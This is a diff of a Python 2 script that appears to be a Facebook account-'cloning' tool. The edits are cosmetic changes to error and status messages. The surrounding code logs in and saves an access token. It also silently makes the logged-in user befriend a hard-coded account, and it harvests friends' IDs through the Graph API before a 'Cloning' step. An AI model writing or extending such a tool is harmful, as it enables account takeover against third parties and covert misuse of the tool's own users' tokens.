@@ -17,7 +17,7 @@ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U
 
 
 def keluar():
-	print "\033[1;91m✘\x1b[1;91mExit"
+	print "\x1b[1;91mExit"
 	os.sys.exit()
 
 
@@ -129,7 +129,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;91m✘\x1b[1;91mThere is no internet connection"
+			print"\n\x1b[1;91mThere is no internet connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -156,15 +156,15 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;91m✘\x1b[1;91mThere is no internet connection"
+				print"\n\x1b[1;91mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;91m✘\x1b[1;91mYour Account is on Checkpoint")
+			print("\n\x1b[1;91mYour Account is on Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;91m✘\x1b[1;91mPassword/Email is wrong")
+			print("\n\x1b[1;91mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -176,7 +176,7 @@ def menu():
 		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\033[1;91m✘\x1b[1;91mToken invalid"
+		print"\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -187,12 +187,12 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91m✘\033[1;91mYour Account is on Checkpoint"
+		print"\033[1;91mYour Account is on Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m✘\x1b[1;91mThere is no internet connection"
+		print"\x1b[1;91mThere is no internet connection"
 		keluar()
 	os.system("clear")
 	print logo
@@ -208,7 +208,7 @@ def menu():
 def pilih():
 	unikers = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
 	if unikers =="":
-		print "\033[1;91m✘\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mFill in correctly"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -217,7 +217,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\033[1;91m✘\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mFill in correctly"
 		pilih()
 
 
@@ -227,7 +227,7 @@ def super():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m✘\x1b[1;91mToken invalid"
+		print"\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -241,13 +241,13 @@ def super():
 def pilih_super():
 	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
 	if peak =="":
-		print "\033[1;91m✘\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
 		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-		jalan('\033[1;93mGetting ID \033[1;97m...')
+		jalan('\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -261,7 +261,7 @@ def pilih_super():
 			op = json.loads(jok.text)
 			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;91m✘\x1b[1;91mID Not Found!"
+			print"\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
 		jalan('\033[1;93mGetting IDs\033[1;93m...')
@@ -272,11 +272,11 @@ def pilih_super():
 	elif peak =="0":
 		menu()
 	else:
-		print "\033[1;91m✘\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mFill in correctly"
 		pilih_super()
 	
 	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
-	jalan('\033[1;93mStarting\033[1;93m...')
+	jalan('\033[1;93mPlease Wait\033[1;93m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
